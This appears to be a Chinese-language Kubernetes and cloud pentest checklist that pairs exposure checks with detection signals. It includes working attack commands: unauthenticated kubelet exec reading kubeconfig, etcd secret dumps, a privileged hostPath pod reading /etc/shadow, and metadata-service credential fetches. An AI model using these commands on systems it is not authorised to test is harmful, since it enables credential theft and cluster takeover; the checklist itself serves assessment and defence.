# K8s 与云安全检查清单：暴露面、过权、缺省不设防

> 被 `cloud-k8s` 引用。这份清单解决的问题不是"能不能打进去"，而是
> **这个集群到底把哪些东西默认摊开在了网络上，以及控制它的那个身份到底有多大的权**。
> 每一项都要求：命令 → 判据 → 检测视角 → 验伤信号。

## 一、先固定身份与范围（不做这步后面全是错账）

```bash
kubectl config current-context
kubectl config view --minify -o jsonpath='{.contexts[0].context.namespace}{"\n"}'
kubectl auth whoami -o wide          # 1.27+；老版本用下面这条
kubectl auth can-i --list            # 当前身份的完整权限矩阵
kubectl version --short              # 服务端版本决定后面很多默认值
kubectl get nodes -o wide            # 节点 IP / 容器运行时 / 内核版本
```

云侧身份同样先钉死，避免"以为在打客户账号，其实在打自己的"：

```bash
aws sts get-caller-identity
aws configure list
az account show -o table
gcloud config list
gcloud auth list --filter=status:ACTIVE
```

**判据**：`kubectl auth can-i --list` 里出现 `*.*` 或 `secrets` 的 `get/list`、
`pods/exec`、`pods/create`、`escalate`、`bind`、`impersonate` 任意一项，就已经够写一条攻击链了。

---

## 二、API Server 暴露面

| 检查点 | 命令 / 位置 | 不安全判据 |
| --- | --- | --- |
| 6443 是否公网可达 | `nmap -Pn -p6443,8080,10250,10255,2379,2380,30000-32767 <ip>` | 6443 对 0.0.0.0/0 开放 |
| 匿名认证 | `ps -ef \| grep kube-apiserver`（master 上）看 `--anonymous-auth` | 显式 `true`（默认值是 true，必须显式关掉才安全） |
| 授权模式 | 同上，看 `--authorization-mode` | 只有 `AlwaysAllow`，或 `Node` 排在前且无 `RBAC` |
| insecure port | 同上，看 `--insecure-port` | 非 0（1.20 后已移除，老集群仍可能 8080） |
| 准入插件 | `--enable-admission-plugins` | 缺 `NodeRestriction`、`ServiceAccount` |
| 审计 | `--audit-log-path` / `--audit-policy-file` | 两个都没配 = 事后查不到任何东西 |

匿名直连（无需任何凭据）：

```bash
curl -sk https://10.0.0.10:6443/api/v1/namespaces/default/pods
curl -sk https://10.0.0.10:6443/version
# 8080 insecure-port 时代（无 TLS 无认证）
curl -s http://10.0.0.10:8080/api/v1/secrets
```

自动化：

```bash
kube-hunter --remote 10.0.0.10 --active      # 远程视角
kube-hunter --pod                           # 从 pod 内部视角（更有价值）
kube-bench run --targets master,node --json # CIS 基线，产出合规证据
```

**检测视角**：apiserver audit log 里 `user.username` 为 `system:anonymous` 的
`get/list` 请求；`verb=list` 且 `objectRef.resource=pods` 的高频扫描。
云侧对应 WAF / 安全组的 6443 入站连接日志。

---

## 三、kubelet 10250 / 10255（最常被忽略的"后门 API"）

10250 是 kubelet 的读写 API，能列 pod、exec、跑命令；10255 是只读端口
（kubelet 的 `--read-only-port`，1.10 之后默认 0/关闭，但老集群和部分发行版仍会打开）。

```bash
# 列 pod（不需要认证时）
curl -sk https://10.0.0.20:10250/pods | jq '.items[].metadata | {namespace,name}'

# 在容器里执行命令 —— 等价于拿到该容器 shell
curl -sk https://10.0.0.20:10250/run/default/mypod/app -d "cmd=id"
curl -sk https://10.0.0.20:10250/run/kube-system/kube-proxy-xxxx/kube-proxy -d "cmd=cat /var/lib/kubelet/kubeconfig"

# 10255 只读（老集群）
curl -s http://10.0.0.20:10255/pods
curl -s http://10.0.0.20:10255/metrics | head
```

不安全判据：`--anonymous-auth=true` + `--authorization-mode=AlwaysAllow`（kubelet 自己的两个 flag，
和组织里 apiserver 的 flag 是两套）。早期版本（1.8 之前 kubelet 默认不认证）最常见，
但手工部署或老发行版至今仍会退化成这个组合。

**检测视角**：kubelet 日志里 `Unauthorized`/匿名 `exec` 请求；节点上对 10250 的非 kube-apiserver 源 IP 访问
（正常只有 apiserver 会连 10250）。云侧安全组的 10250 入站记录基本等于事故。

---

## 四、etcd（拿到就是全量 secret）

```bash
# 端口与 TLS 状态
nmap -Pn -p2379,2380 --script ssl-cert 10.0.0.5
curl -sk https://10.0.0.5:2379/version     # 无 cert 时通常 400/证书错误

# 有证书（或 etcd 未开 client cert 校验）直接读
export ETCDCTL_API=3
etcdctl --endpoints=https://10.0.0.5:2379 \
  --cacert=/etc/kubernetes/pki/etcd/ca.crt \
  --cert=/etc/kubernetes/pki/etcd/server.crt \
  --key=/etc/kubernetes/pki/etcd/server.key \
  get / --prefix --keys-only | grep -i secret | head

etcdctl ... get /registry/secrets/kube-system/bootstrap-token-abcde --print-value-only | strings
```

密钥来源（拿到任一 master 的 shell 就能取）：`/etc/kubernetes/manifests/etcd.yaml` 的
`--cert-file/--key-file`、`/etc/kubernetes/pki/etcd/`、kubeadm 的 `admin.conf`。

**不安全判据**：2379 对非 master 网段开放；`--client-cert-auth=false`；etcd 数据目录未加密（
看 apiserver 有没有 `--encryption-provider-config`）。

**检测视角**：etcd 自身日志的 `authentication failed` 突发；master 上 2379 的异常源 IP。
K8s 审计里看不到 etcd 直连，这是它"静默"的原因，也是它危险的原因。

---

## 五、Dashboard 与其它附加组件

```bash
# Dashboard
curl -sk https://10.0.0.10:30443/    # 常见 NodePort 30443 / 8443
# 判据：页面能打开且无需登录 → --enable-skip-login
# 拿到 token 后可直连：/api/v1/namespaces/kube-system/secrets/

# 其它常被忘的
kubectl get svc -A | grep -Ei 'dashboard|grafana|prometheus|argocd|jenkins|kibana'
kubectl get ingress -A
```

**验伤**：`kubectl --token=<dashboard token> auth can-i --list` 返回 `cluster-admin` 才叫打穿；
只看到登录页不算。

---

## 六、RBAC 过权（真正决定成败的一项）

```bash
# 谁被绑成了 cluster-admin
kubectl get clusterrolebindings -o json | jq -r '
  .items[] | select(.roleRef.name=="cluster-admin") |
  .subjects[]? | "\(.kind)/\(.namespace // "-")/\(.name)"'

# 通配符角色
kubectl get clusterroles -o json | jq -r '
  .items[] | select(.rules[]?.verbs[]?=="*") | .metadata.name' | sort -u

# 谁能读 secret / exec / 建 pod（aquasecurity/kubectl-who-can）
kubectl who-can get secrets -n kube-system
kubectl who-can create pods
kubectl who-can create pods/exec

# 危险权限逐项
kubectl get clusterroles -o json | jq -r '
  .items[] | select(.rules[]? | (.verbs|index("escalate")) or (.verbs|index("bind")) or (.resources|index("users")) )
  | .metadata.name'
```

高危 RBAC 组合（单条即可提权）：

| 权限 | 为什么致命 |
| --- | --- |
| `secrets: get,list`（全 ns） | 直接读出 SA token / TLS key / 数据库口令 |
| `pods: create` + 无 PSA 限制 | 建特权 pod 挂 hostPath 打节点 |
| `pods/exec: create` | 进任意 pod，包括 kube-system |
| `daemonsets: create` | 每个节点起一个 pod |
| `nodes/proxy: get` | 直通 kubelet API，绕过 apiserver 审计 |
| `escalate` / `bind` | 自己给自己绑 cluster-admin |
| `impersonate` | 以 `system:admin` 身份发请求 |
| `certificatesigningrequests: approve` | 签出合法 kubelet client 证书 |
| `serviceaccounts/token: create` | 给任意 SA 铸 token |

**检测视角**：audit log 中 `rbac.authorization.k8s.io` 的 `create`（RoleBinding/ClusterRoleBinding）、
`impersonate` 会体现在 `impersonatedUser.username` 字段；`escalate` 通常伴随 Role 的 `rules` 修改。

---

## 七、ServiceAccount token 挂载与滥用

```bash
# 容器内默认路径
ls -la /var/run/secrets/kubernetes.io/serviceaccount/
# token / ca.crt / namespace 三个文件
cat /var/run/secrets/kubernetes.io/serviceaccount/token | cut -d. -f2 | base64 -d 2>/dev/null | jq .

# 集群侧：谁在自动挂 token
kubectl get pods -A -o json | jq -r '
  .items[] | select(.spec.automountServiceAccountToken != false) |
  "\(.metadata.namespace)/\(.metadata.name) sa=\(.spec.serviceAccountName)"' | head -30

# 老式长期 token（1.24 前每个 SA 自动建一个 secret）
kubectl get secrets -A --field-selector type=kubernetes.io/service-account-token
```

**判据**：业务 pod 用 `default` SA 且 `automountServiceAccountToken` 未显式 `false`；
`default` SA 被绑了任何非空 Role。Token 的 JWT payload 里 `sub` 是
`system:serviceaccount:<ns>:<name>`，这就是后面所有权限判断的依据。

**注意 1.24+ 变化**：不再自动生成长期 token Secret，用 projected volume 的短时 token，
带 `aud` 限制。把这种 token 拿去打别的 audience 的服务会被拒——这是常见误判点。

---

## 八、NetworkPolicy 缺失（"集群内网就是内网"的幻觉）

```bash
kubectl get networkpolicy -A
kubectl get ciliumnetworkpolicies -A 2>/dev/null
kubectl get calicoctl ... 2>/dev/null
# 直接实测：从一个 pod 打另一个 ns 的 service
kubectl run nptest --rm -it --image=nicolaka/netshoot --restart=Never -- \
  sh -c 'nc -zv -w3 mydb.data.svc.cluster.local 5432; curl -s -m3 http://api.prod.svc:8080/health'
```

**关键坑**：策略对象存在 ≠ 生效。flannel 不支持 NetworkPolicy；Calico 需要
`--enable-policy` 且节点有 Felix；Cilium 需要 policy enforcement mode 不是 `disabled`。

**检测视角**：CNI 的 flow log（Cilium Hubble `hubble observe --verdict DROPPED`）；
策略存在但没 drop 记录，往往是 enforcement 没开。

---

## 九、Secret 明文与审计缺失

```bash
# Secret 只是 base64 —— 谁能 get 谁就能读明文
kubectl get secret db-cred -o jsonpath='{.data.password}' | base64 -d

# 审计是否真的在写
kubectl get pods -n kube-system | grep -i apiserver
kubectl exec -n kube-system kube-apiserver-x -- ls -l /var/log/kubernetes/audit/ 2>/dev/null
# 没配 --audit-log-path 时，某些托管集群只把审计丢到云日志服务（要另开）

# 静态加密
grep -i encryption /etc/kubernetes/manifests/kube-apiserver.yaml
kubectl get secret -A -o json | jq '.items[].data' | wc -l    # 数量本身就是暴露面
```

**判据**：Secret 出现在 pod 的 `env`（会进 `/proc/1/environ`、崩溃 dump、日志），
而不是挂载成文件；etcd 未加 `EncryptionConfiguration`；审计日志未开或保留期 < 30 天。

---

## 十、Admission / PSA 缺失

```bash
# 命名空间是否启用了 Pod Security Admission
kubectl get ns -o json | jq -r '.items[] |
  "\(.metadata.name)\t\(.metadata.labels["pod-security.kubernetes.io/enforce"] // "none")"'

# 是否有策略引擎
kubectl get validatingwebhookconfigurations,mutatingwebhookconfigurations
kubectl get crd | grep -Ei 'kyverno|gatekeeper|constraints'

# 实测：能不能建特权 pod（这是最直接的验伤）
kubectl run privtest --image=alpine --restart=Never --overrides='
{"spec":{"containers":[{"name":"c","image":"alpine","command":["sleep","3600"],
"securityContext":{"privileged":true},"volumeMounts":[{"name":"h","mountPath":"/host"}]}],
"volumes":[{"name":"h","hostPath":{"path":"/"}}]}}'
```

**判据**：`enforce` 列几乎全是 `none`，且没有 Kyverno/Gatekeeper；
能成功创建 `privileged: true` 的 pod。

---

## 十一、云侧配套检查

```bash
# 公开桶
aws s3 ls --no-sign-request s3://target-bucket
aws s3api get-bucket-acl --bucket target-bucket
aws s3api get-bucket-policy --bucket target-bucket | jq .

# 安全组开口
aws ec2 describe-security-groups --filters Name=ip-permission.cidr,Values=0.0.0.0/0 \
  --query 'SecurityGroups[].[GroupId,GroupName,IpPermissions]' --output table

# IAM 通配
aws iam list-attached-user-policies --user-name bob
aws iam get-policy-version --policy-arn <arn> --version-id v3 \
  --query 'PolicyVersion.Document' | jq '.. | .Action? // empty'

# 实例角色（从实例内部）
curl -s http://169.254.169.254/latest/meta-data/iam/security-credentials/
```

Azure / GCP 对应：`az storage container list --account-name x --auth-mode login`、
`gcloud storage buckets list`、`gcloud projects get-iam-policy <p> --format=json`。

详细元数据链路见 `cloud-metadata-path.md`，本篇只做"有没有开"的判断。

---

## 十二、检测视角汇总

| 手法 | 日志位置 | 具体信号 |
| --- | --- | --- |
| 匿名访问 apiserver | apiserver audit | `user.username=system:anonymous` |
| kubelet exec | kubelet log / 节点 audit | 源 IP 不是 apiserver 的 10250 `POST /run` |
| etcd 直读 | etcd log | `authentication failed` 突发 + 非 master 源 IP |
| 特权 pod | audit + PSA 事件 | `create pods` 带 `securityContext.privileged` |
| RBAC 自提权 | audit | `create clusterrolebindings` / `bind` / `escalate` |
| 铸 SA token | audit | `create serviceaccounts/token` |
| 借 kubelet 绕过 | audit 缺失但节点有 | `nodes/proxy` GET |
| Secret 批量读 | audit | 单身份短时间 `get secrets` 跨 ns |

## 十三、验伤信号（怎么证明"真的拿到了"）

| 声称 | 有效证据 | 看起来成功其实是假 |
| --- | --- | --- |
| 拿到集群管理员 | 新建特权 pod 并 `cat /host/etc/shadow` 有内容 | `auth can-i --list` 有 `*` 但 create pod 被 PSA 拒 |
| 拿到 kubelet 控制 | `/run` 返回 `uid=0(root)` | 只返回了 `/pods` JSON（只读，无法执行） |
| 拿到 etcd 全量 | `get /registry/secrets/...` 解出明文密码 | 端口通但返回 `http2: frame too large`（不是 etcd 或需 TLS） |
| 拿到云凭据 | 用该凭据 `aws sts get-caller-identity` 返回目标账号 ID | 拿到的是实例 profile 名而非 AK/SK |
| 跨 ns 横向 | 从 ns A 的 pod 真连通 ns B 的 service | 策略对象存在但 CNI 未 enforce |

## 十四、常见坑

1. **多 context 打错集群**。`kubectl config get-contexts` 先看一眼；生产集群的 kubeconfig
   常常和测试的同名。这是最容易造成事故的一条。
2. **把 apiserver 的 flag 和 kubelet 的 flag 混为一谈**。两者是不同进程、不同配置文件
   （`/etc/kubernetes/manifests/kube-apiserver.yaml` vs `/var/lib/kubelet/config.yaml`）。
3. **Token audience 不匹配**。1.24+ 的 projected token 绑定 audience，拿去调云 API 或
   另一个集群会 401，误判成"权限不够"。
4. **NetworkPolicy 有对象没生效**。先看 CNI 类型，再谈隔离结论。
5. **托管集群看不到 master**。EKS/GKE/ACK 拿不到 etcd 和 apiserver 静态 pod，
   这类环境要把力气放在 RBAC、IRSA/Workload Identity、节点 IAM 上，别在 etcd 上耗时间。
6. **PSA restricted 会静默拒绝**。`kubectl run` 报的是 `pods "x" is forbidden: violates PodSecurity`，
   不是网络问题，别去查 CNI。